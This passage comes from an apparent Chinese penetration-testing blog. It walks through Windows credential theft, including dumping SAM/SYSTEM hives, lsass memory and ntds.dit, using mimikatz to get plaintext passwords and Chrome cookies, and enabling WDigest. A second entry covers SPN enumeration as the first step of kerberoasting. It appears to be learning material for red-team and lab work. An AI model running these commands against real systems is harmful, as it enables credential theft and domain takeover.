<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>powershell <span class="token operator">-</span>exec bypass</pre></td></tr><tr><td data-num="2"></td><td><pre>Import<span class="token operator">-</span>Module <span class="token punctuation">.</span>\invoke<span class="token operator">-</span>ninjacopy<span class="token punctuation">.</span>ps1</pre></td></tr><tr><td data-num="3"></td><td><pre>Invoke<span class="token operator">-</span>NinjaCopy <span class="token operator">-</span>Path <span class="token constant">C</span><span class="token operator">:</span>\Windows\System32\config\<span class="token constant">SAM</span> <span class="token operator">-</span>LocalDestination <span class="token punctuation">.</span>\sam<span class="token punctuation">.</span>hive</pre></td></tr><tr><td data-num="4"></td><td><pre>Invoke<span class="token operator">-</span>NinjaCopy <span class="token operator">-</span>Path <span class="token constant">C</span><span class="token operator">:</span>\Windows\System32\config\<span class="token constant">SYSTEM</span> <span class="token operator">-</span>LocalDestination <span class="token punctuation">.</span>\system<span class="token punctuation">.</span>hive</pre></td></tr></table></figure><p>将生成的 <code>sam.hive</code>  与 <code>system.hive</code>  转至本地，使用 <code>saminside</code>  或 <code>cain</code>  导入</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamI1MS5uZXQvc29mdHMvNjI5NDU4Lmh0bWw=">saminside 脚本之家下载地址</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamI1MS5uZXQvc29mdHMvMjUzMTU1Lmh0bWw=">cain 脚本之家下载链接</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206145544837.png" alt="image-20211206145544837" /></p>
<p>结果如下：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206145954489.png" alt="image-20211206145954489" /></p>
<h2 id="procdump"><a class="anchor" href="#procdump">#</a> Procdump</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vc3lzaW50ZXJuYWxzL2Rvd25sb2Fkcy9wcm9jZHVtcA==">官网下载链接</span></p>
<p>离线提取进行 <code>lsass</code> ， <code>vista</code>  及以上系统可以看到 <code>lsass</code>  进程，右键创建转储文件.</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Procdump<span class="token punctuation">.</span>exe <span class="token operator">-</span>ma lsass<span class="token punctuation">.</span>exe lsass<span class="token punctuation">.</span>dmp</pre></td></tr></table></figure><p>获取到内存转储文件后，就可以使用 <code>mimikatz</code>  提取密码.</p>
<p>这里需要注意的是，运行 <code>mimikatz</code>  平台架构要与转储的系统兼容</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">Sekurlsa</span><span class="token operator">:</span><span class="token operator">:</span>minidump lsass<span class="token punctuation">.</span>dmp</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token literal-property property">Sekurlsa</span><span class="token operator">:</span><span class="token operator">:</span>logonpasswords</pre></td></tr></table></figure><p>导出域用户 <code>hash</code> , 访问域控的 <code>C:\Windows\NTDS</code>  文件夹</p>
<p>记录 <code>GUID</code>  并且替换之后的命令</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>ntdsutil snapshot “mount <span class="token punctuation">&#123;</span><span class="token constant">GUID</span><span class="token punctuation">&#125;</span>” quit quit</pre></td></tr></table></figure><p>C 盘中会生成新目录，将其中的 <code>Windows\NTDS\ntds.dit</code>  拷贝出来</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>ntdsutil snapshot “unmount <span class="token punctuation">&#123;</span><span class="token constant">GUID</span><span class="token punctuation">&#125;</span>” quit quit</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>ntdsutil snapshot <span class="token string">" delete &#123;GUID&#125; "</span> quit quit</pre></td></tr></table></figure><h2 id="使用ntdsdumpexexe提取hash"><a class="anchor" href="#使用ntdsdumpexexe提取hash">#</a> 使用 Ntdsdumpex.exe 提取 hash</h2>
<p><span class="exturl" data-url="aHR0cDovL3d3dy56Y2dvbnZoLmNvbS96Yl91c2Vycy91cGxvYWQvMjAxNy8wMi8yMDE3MDIyMzE5MTYzOTE0ODc4NDg1OTk0MDIzMS56aXA=">NTDSDumpEx 下载链接</span></p>
<p>解压密码： <code>zcgonvh</code></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Ntdsdumpex<span class="token punctuation">.</span>exe <span class="token operator">-</span>r <span class="token operator">-</span>d ntds<span class="token punctuation">.</span>dit –o hash<span class="token punctuation">.</span>txt</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206150716041.png" alt="image-20211206150716041" /></p>
<p>如有设置密码则会生成相应的 <code>hash</code>  文件</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206150755715.png" alt="image-20211206150755715" /></p>
<p>使用 <code>mimakatz</code>  获取 <code>hash</code>  与明文口令</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>privilege<span class="token operator">::</span><span class="token function">debug</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>sekurlsa<span class="token operator">::</span><span class="token function">logonPasswords</span></pre></td></tr></table></figure><p>从  <code>Windows 8.1</code>  和  <code>Windows Server 2012 R2</code>  开始， <code>LM</code>  哈希和 “纯文本” 密码将不在内存中生成，早期版本的 <code>Windows 7/8/2008 R2/2012</code>  需要打  <code>kb2871997</code>  补丁。</p>
<p>抓取到了 <code>NTLM</code>  后，<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vMjFyMDAwL3Avd3d3LmNtZDUuY29t">破解 MD5</span></p>
<p>尝试<span class="exturl" data-url="aHR0cHM6Ly93d3cub2JqZWN0aWYtc2VjdXJpdGUuY2gvb3BoY3JhY2sucGhw">破解 2-ophcrack</span></p>
<p>修改注册表，启用摘要密码支持</p>
<p>需要创建 <code>UseLogonCredential</code> ，并赋值为 <code>1</code></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">HKEY_LOCAL_MACHINE</span>\<span class="token constant">SYSTEM</span>\CurrentControlSet\Control\SecurityProviders \WDigest <span class="token function">“UseLogonCredential”</span><span class="token punctuation">(</span><span class="token constant">DWORD</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>重新登录后，再次运行就会直接抓取明文密码。</p>
<h2 id="mimikatz提取chrome中保存的cookie"><a class="anchor" href="#mimikatz提取chrome中保存的cookie">#</a> mimikatz 提取 chrome 中保存的 cookie</h2>
<p>首先把 <code>chrome</code>  保存 <code>cookie</code>  的文件拷贝到桌面上方便操作，这个文件在</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">C</span><span class="token operator">:</span>\users\xxx\appdata\local\google\chrome\user data\<span class="token keyword">default</span>\cookies</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206151704318.png" alt="image-20211206151704318" /></p>
<p>命令行下拷贝的命令是：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Copy '<span class="token constant">C</span><span class="token operator">:</span>\users\xxx\appdata\local\google\chrome\user data\<span class="token keyword">default</span>\cookies ’ c<span class="token operator">:</span>\users\xxx\desktop</pre></td></tr></table></figure><p><code>mimikatz_trunk</code>  文件包中有个 <code>x64</code>  文件夹，进入并打开 <code>mimikatz.exe</code> ，输入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206152317965.png" alt="image-20211206152317965" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">dpapi</span><span class="token operator">:</span><span class="token operator">:</span>chrome <span class="token operator">/</span><span class="token keyword">in</span><span class="token operator">:</span>c<span class="token operator">:</span>\users\xxx\desktop\cookies <span class="token operator">/</span>unprotect</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206152131712.png" alt="image-20211206152131712" /></p>
<p>提取 <code>cookie</code> ， <code>mimikatz</code>  的 <code>token</code>  模块中的命令列出 <code>token</code> ，模仿 <code>system</code>  用户 <code>token</code> <br />
 选择以<strong>管理员身份</strong>运行 <code>mimikatz.exe</code> ，</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>privilege<span class="token operator">::</span><span class="token function">debug</span> #获取debug权限</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>token<span class="token operator">::</span><span class="token function">elevate</span> #模仿system用户的令牌</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>token<span class="token operator">::</span><span class="token function">list</span> #列出令牌</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>lsadump<span class="token operator">::</span><span class="token function">sam</span> #来获取sam数据库中的密码</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>token<span class="token operator">::</span><span class="token function">revert</span> #恢复令牌</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211206152509111.png" alt="image-20211206152509111" /></p>
<h2 id="感言"><a class="anchor" href="#感言">#</a> 感言：</h2>
<p>好吧，没有感言！</p>
<p>参考链接：<br />
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjk5ODQyMC9hcnRpY2xlL2RldGFpbHMvODMyNjk5NTg=">内网渗透测试的艺术 [二] 凭证收集</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>windows信息搜集篇（二）之SPN</title>
    <url>/article/ffbd8b0.html</url>
    <content><![CDATA[<p>唔，上篇是自己找的资料写的，这篇按大佬的要求整理一下。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129204706637-262725350.jpg" alt="image" /></p>
<h2 id="spn"><a class="anchor" href="#spn">#</a> SPN</h2>
<h3 id="spn概述"><a class="anchor" href="#spn概述">#</a> SPN 概述</h3>
<p>SPN( <code>ServicePrincipal Names</code> ) 服务主体名称，是服务实例 (比如：HTTP、SMB、MySQL 等服务) 的唯一标识符。</p>
<p><code>Kerberos</code>  认证过程使用 SPN 将服务实例与服务登录账户相关联，如果想使用  <code>Kerberos</code>  协议来认证服务，那么必须正确配置 SPN。如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的 SPN。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个 SPN。SPN 始终包含运行服务实例的主机的名称，因此服务实例可以为其主机的每个名称或别名注册 SPN。一个用户账户下可以有多个 SPN，但一个 SPN 只能注册到一个账户。在内网中，SPN 扫描通过查询向域控服务器执行服务发现。这对于红队而言，可以帮助他们识别正在运行重要服务的主机，如终端，交换机等。SPN 的识别是 <code>kerberoasting</code>  攻击的第一步。</p>
<p>下面通过一个例子来说明 SPN 的作用：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>当某用户需要访问MySQL服务时，系统会以当前用户的身份向域控查询<span class="token constant">SPN</span>为MySQL的记录。</pre></td></tr><tr><td data-num="2"></td><td><pre>当找到该<span class="token constant">SPN</span>记录后，用户会再次与<span class="token constant">KDC</span>通信，将<span class="token constant">KDC</span>发放的<span class="token constant">TGT</span>作为身份凭据发送给<span class="token constant">KDC</span>，并将需要访问的<span class="token constant">SPN</span>发送给<span class="token constant">KDC</span>。</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token constant">KDC</span>中的<span class="token constant">TGS</span>服务对<span class="token constant">TGT</span>进行解密。确认无误后，由<span class="token constant">TGS</span>将一张允许访问该<span class="token constant">SPN</span>所对应的服务的<span class="token constant">ST</span>服务票据和该<span class="token constant">SPN</span>所对应的服务的地址发送给用户，用户使用该票据即可访问MySQL服务。</pre></td></tr></table></figure><h4 id="spn的两种类型"><a class="anchor" href="#spn的两种类型">#</a> SPN 的两种类型：</h4>
<p>一种是注册在活动目录的机器帐户 ( <code>Computers</code> ) 下，当一个服务的权限为  <code>Local System</code>  或  <code>Network Service</code> ，则 SPN 注册在机器帐户 ( <code>Computers</code> ) 下。</p>
<p>另一种是注册在活动目录的域用户帐户 ( <code>Users</code> ) 下，当一个服务的权限为一个域用户，则 SPN 注册在域用户帐户 ( <code>Users</code> ) 下。</p>
<h4 id="sqlserver服务注册"><a class="anchor" href="#sqlserver服务注册">#</a> SQLServer 服务注册：</h4>
<p><code>SQLServer</code>  在每次启动的时候，都会去尝试用自己的启动账号注册 <code>SPN</code> 。但是在 <code>Windows</code>  域里，默认普通机器账号有权注册 SPN，但是普通域用户账号是没有权注册 SPN 的。这就会导致这样一个现象， <code>SQL Server</code>  如果使用 “ <code>Local System account</code> ” 来启动， <code>Kerberos</code>  就能够成功，因为 <code>SQL Server</code>  这时可以在 <code>DC</code>  上注册 <code>SPN</code> 。如果用一个域用户来启动， <code>Kerberos</code>  就不能成功，因为这时 <code>SPN</code>  注册不上去。</p>
<p><strong>解决办法：</strong></p>
<ul>
<li>可以使用工具 SetSPN -S 来手动注册 SPN。但是这不是一个最好的方法，毕竟手工注册不是长久之计。如果 SPN 下次丢了，又要再次手动注册。</li>
<li>所以比较好的方法，是让 <code>SQL Server</code>  当前启动域账号有注册 <code>SPN</code>  的权力。要在 DC 上为域账号赋予 “ <code>Read servicePrincipalName</code> ” 和 “ <code>Write serverPrincipalName</code> ” 的权限即可。</li>
</ul>
<h3 id="spn的配置"><a class="anchor" href="#spn的配置">#</a> SPN 的配置</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vd2luZG93cy1zZXJ2ZXIvbmV0d29ya2luZy9zZG4vc2VjdXJpdHkva2VyYmVyb3Mtd2l0aC1zcG4=">微软官方文档</span></p>
<p>在  <code>SPN</code>  的语法中存在四种元素，两个必须元素和两个额外元素，其中 和 为必须元素：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">SPN</span>格式：<span class="token operator">&lt;</span>service <span class="token keyword">class</span><span class="token operator">></span><span class="token operator">/</span><span class="token operator">&lt;</span>host<span class="token operator">></span><span class="token operator">:</span><span class="token operator">&lt;</span>port<span class="token operator">></span><span class="token operator">/</span><span class="token operator">&lt;</span>service name<span class="token operator">></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">&lt;</span>service <span class="token keyword">class</span><span class="token operator">></span>：标识服务类的字符串，可以理解为服务的名称，常见的有<span class="token constant">WWW</span>、MySQL、<span class="token constant">SMTP</span>、<span class="token constant">MSSQL</span>等；必须元素</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">&lt;</span>host<span class="token operator">></span>：服务所在主机名，host有两种形式，<span class="token constant">FQDN</span><span class="token punctuation">(</span>win7<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>com<span class="token punctuation">)</span><span class="token function">和NetBIOS</span><span class="token punctuation">(</span>win7<span class="token punctuation">)</span>名；必须元素</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">&lt;</span>port<span class="token operator">></span>：服务端口<span class="token punctuation">,</span>如果服务运行在默认端口上<span class="token punctuation">,</span><span class="token function">则端口号</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span>可以省略；额外元素</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">&lt;</span>service name<span class="token operator">></span>：服务名称<span class="token punctuation">,</span>可以省略；额外元素</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>一些服务的<span class="token constant">SPN</span>示例：</pre></td></tr><tr><td data-num="9"></td><td><pre>#Exchange服务</pre></td></tr><tr><td data-num="10"></td><td><pre>exchangeMDB<span class="token operator">/</span>ex01<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>com</pre></td></tr><tr><td data-num="11"></td><td><pre>#<span class="token constant">RDP</span>服务</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token constant">TERMSERV</span><span class="token operator">/</span>te01<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>com</pre></td></tr><tr><td data-num="13"></td><td><pre>#WSMan<span class="token operator">/</span>WinRM<span class="token operator">/</span>PSRemoting服务</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token constant">WSMAN</span><span class="token operator">/</span>ws01<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>com</pre></td></tr></table></figure><h3 id="使用setspn注册spn"><a class="anchor" href="#使用setspn注册spn">#</a> 使用 SetSPN 注册 SPN</h3>
<p><code>SetSPN</code>  是一个本地 <code>Windows</code>  二进制文件，可用于检索用户帐户和服务之间的映射。该实用程序可以添加，删除或查看 <code>SPN</code>  注册。</p>
<p>环境描述：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>主机：win7<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>org</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>域控：win2012<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>org</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>当前用户：21r000<span class="token operator">/</span>test</pre></td></tr></table></figure><p>查看 SPN 是否已注册：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>setspn <span class="token operator">-</span><span class="token constant">L</span> sccmdb</pre></td></tr></table></figure><p>查询是否有重复的 <code>SPN</code>  存在：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>setspn <span class="token operator">-</span><span class="token constant">X</span></pre></td></tr></table></figure><p>在运行 <code>sql server</code>  的计算机上注册， <code>setspn.exe</code>  工具包含在 <code>windows server2003 sp1 support tools</code>  中<br />
使用域管理员登陆后，手动注册默认实例：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>setspn <span class="token operator">-</span><span class="token constant">A</span> MSSQLSvc<span class="token operator">/</span>win7<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>com<span class="token operator">:</span><span class="token number">1433</span> 21r000\win7</pre></td></tr></table></figure><p><strong>注：使用 “-S” 参数而不是用 “-A” 的话则会先验证其要注册的 SPN 是否已存在，如果已存在则提示，并终止操作。</strong></p>
<p><strong>注：注册 SPN 需要域管理员权限，普通域成员注册会提示权限不够！</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129205143295-59301349.png" alt="image" /></p>
<p><strong>以 test 用户的身份进行 SPN 服务的注册</strong></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>setspn <span class="token operator">-</span><span class="token constant">S</span> SQLServer<span class="token operator">/</span>win7<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>com<span class="token operator">:</span><span class="token number">1433</span> 21r000    #21r000必须是当前的用户或setspn <span class="token operator">-</span><span class="token constant">U</span> <span class="token operator">-</span><span class="token constant">A</span> SQLServer<span class="token operator">/</span>win7<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>com<span class="token operator">:</span><span class="token number">1433</span> 21r000    #21r000必须是当前的用户</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129205210922-220277038.png" alt="image" /></p>
<p><strong>以 WIN7 主机的身份在 DC (<span class="exturl" data-url="aHR0cDovL3dpbjIwMTIuMjFyMDAwLm9yZw==">win2012.21r000.org</span>) 上进行 SPN 服务 (SQLServer) 的注册</strong></p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>setspn <span class="token operator">-</span><span class="token class-name">S</span> <span class="token class-name">SQLServer</span><span class="token operator">/</span>win7<span class="token punctuation">.</span><span class="token number">21</span>r000<span class="token punctuation">.</span>com<span class="token operator">:</span><span class="token number">1533</span><span class="token operator">/</span>MSSQL <span class="token number">21</span>r000    #<span class="token number">21</span>r000必须是当前的主机名</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129205230352-1729074092.png" alt="image" /></p>
<p>如果提示重复，我们可以将端口修改为其他端口，就不是重复的 SPN 了。</p>
<h3 id="spn的发现"><a class="anchor" href="#spn的发现">#</a> SPN 的发现</h3>
<p>由于每台服务器都需要注册用于 <code>Kerberos</code>  身份验证服务的 SPN，因此这为在不进行大规模端口扫描的情况下收集有关内网域环境的信息提供了一个更加隐蔽的方法。</p>
<h4 id="使用setspn查询"><a class="anchor" href="#使用setspn查询">#</a> 使用 SetSPN 查询：</h4>
<p>windows 系统自带的 setspn 可以查询域内的 SPN。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>查看当前域内所有的<span class="token constant">SPN</span>：setspn  <span class="token operator">-</span><span class="token constant">Q</span>  <span class="token operator">*</span><span class="token comment">/*</pre></td></tr><tr><td data-num="2"></td><td><pre>查看指定域 xie.com 注册的 SPN：setspn -T xie.com -Q */</span><span class="token operator">*</span>      如果指定域不存在，则默认切换到查找本域的<span class="token constant">SPN</span></pre></td></tr><tr><td data-num="3"></td><td><pre>查找本域内重复的<span class="token constant">SPN</span>：setspn <span class="token operator">-</span><span class="token constant">X</span></pre></td></tr><tr><td data-num="4"></td><td><pre>删除指定<span class="token constant">SPN</span>：setspn <span class="token operator">-</span><span class="token constant">D</span> MySQL<span class="token operator">/</span>win7<span class="token punctuation">.</span>xie<span class="token punctuation">.</span>com<span class="token operator">:</span><span class="token number">1433</span><span class="token operator">/</span><span class="token constant">MSSQL</span> hack</pre></td></tr><tr><td data-num="5"></td><td><pre>查找指定用户<span class="token operator">/</span>主机名注册的<span class="token constant">SPN</span>：setspn <span class="token operator">-</span><span class="token constant">L</span> username<span class="token operator">/</span>hostname</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129205300777-2009351931.png" alt="image" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129205306541-1204845771.png" alt="image" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129205312941-1698181958.png" alt="image" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129205319493-2125462080.png" alt="image" /></p>
<h4 id="powershell-ad-recon"><a class="anchor" href="#powershell-ad-recon">#</a> PowerShell-AD-Recon：</h4>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hhY2ttaXNzL1Bvd2VyU2hlbGwtQUQtUmVjb24=">项目地址</span></p>
<p>该工具包提供了一些探测指定 SPN 的脚本，例如 <code>Exchange，Microsoft SQLServer，Terminal</code>  等</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129205352829-526913716.png" alt="image" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>#Discover<span class="token operator">-</span>PSMSSQLServers<span class="token punctuation">.</span>ps1的使用<span class="token punctuation">,</span>扫描<span class="token constant">MSSQL</span>服务</pre></td></tr><tr><td data-num="2"></td><td><pre>Import<span class="token operator">-</span>Module <span class="token punctuation">.</span>\Discover<span class="token operator">-</span>PSMSSQLServers<span class="token punctuation">.</span>ps1<span class="token punctuation">;</span>Discover<span class="token operator">-</span>PSMSSQLServers</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>#Discover<span class="token operator">-</span>PSMSExchangeServers<span class="token punctuation">.</span>ps1的使用，扫描Exchange服务</pre></td></tr><tr><td data-num="5"></td><td><pre>Import<span class="token operator">-</span>Module <span class="token punctuation">.</span>\Discover<span class="token operator">-</span>PSMSExchangeServers<span class="token punctuation">.</span>ps1<span class="token punctuation">;</span>Discover<span class="token operator">-</span>PSMSExchangeServers</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>#扫描域中所有的<span class="token constant">SPN</span>信息</pre></td></tr><tr><td data-num="8"></td><td><pre>Import<span class="token operator">-</span>Module <span class="token punctuation">.</span>\Discover<span class="token operator">-</span>PSInterestingServices<span class="token punctuation">.</span>ps1<span class="token punctuation">;</span>Discover<span class="token operator">-</span>PSInterestingServices</pre></td></tr></table></figure><p>下面由于靶机文件传输问题盗用一下佬的图，勿怪。</p>
<h4 id="getuserspnsps1"><a class="anchor" href="#getuserspnsps1">#</a> GetUserSPNs.ps1：</h4>
<p><code>GetUserSPNs</code>  是  <code>Kerberoast</code>  工具集中的一个  <code>powershell</code>  脚本，用来查询域内用户注册的 SPN。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25pZGVtL2tlcmJlcm9hc3QvYmxvYi9tYXN0ZXIvR2V0VXNlclNQTnMucHMx">项目地址</span></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Import<span class="token operator">-</span>Module <span class="token punctuation">.</span>\GetUserSPNs<span class="token punctuation">.</span>ps1</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129205434570-842090250.png" alt="image" /></p>
<h4 id="getuserspnsvbs"><a class="anchor" href="#getuserspnsvbs">#</a> GetUserSPNs.vbs：</h4>
<p><code>GetUserSPNs</code>  是  <code>Kerberoast</code>  工具集中的一个  <code>vbs</code>  脚本，用来查询域内用户注册的  <code>SPN</code> 。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25pZGVtL2tlcmJlcm9hc3QvYmxvYi9tYXN0ZXIvR2V0VXNlclNQTnMudmJz">项目地址</span></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>cscript <span class="token punctuation">.</span>\GetUserSPNs<span class="token punctuation">.</span>vbs</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129205512869-1347225001.png" alt="image" /></p>
<h4 id="powerviewps1"><a class="anchor" href="#powerviewps1">#</a> PowerView.ps1：</h4>
<p><code>PowerView</code>  是  <code>PowerSpolit</code>  中  <code>Recon</code>  目录下的一个 <code>powershell</code>  脚本， <code>PowerView</code>  相对于上面几种是根据不同用户的  <code>objectsid</code>  来返回，返回的信息更加详细。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC9ibG9iL2Rldi9SZWNvbi9Qb3dlclZpZXcucHMx">项目地址</span></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Import<span class="token operator">-</span>Module <span class="token punctuation">.</span>\PowerView<span class="token punctuation">.</span>ps1</pre></td></tr><tr><td data-num="2"></td><td><pre>Get<span class="token operator">-</span>NetUser <span class="token operator">-</span><span class="token constant">SPN</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211129205604983-1651773650.png" alt="image" /></p>
<h4 id="powershellery"><a class="anchor" href="#powershellery">#</a> PowerShellery：</h4>
<p><code>PowerShellery</code>  下有各种各样针对服务 SPN 探测的脚本。其中一些需要 <code>PowerShell v2.0</code>  的环境，还有一些则需要 <code>PowerShell v3.0</code>  环境。</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>#<span class="token class-name">Powershellery</span><span class="token operator">/</span><span class="token class-name">Stable</span><span class="token operator">-</span>ish<span class="token operator">/</span><span class="token class-name">Get</span><span class="token operator">-</span>SPN<span class="token operator">/</span> 下<span class="token class-name">Get</span><span class="token operator">-</span>SPN<span class="token punctuation">.</span>psm1脚本的使用<span class="token punctuation">,</span>需要powershell3<span class="token punctuation">.</span><span class="token number">0</span>及以上版本才能使用</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token class-name">Import</span><span class="token operator">-</span><span class="token class-name">Module</span> <span class="token punctuation">.</span>\<span class="token class-name">Get</span><span class="token operator">-</span>SPN<span class="token punctuation">.</span>psm1</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token class-name">Get</span><span class="token operator">-</span>SPN <span class="token operator">-</span>type service <span class="token operator">-</span>search <span class="token string">"*"</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token class-name">Get</span><span class="token operator">-</span>SPN <span class="token operator">-</span>type service <span class="token operator">-</span>search 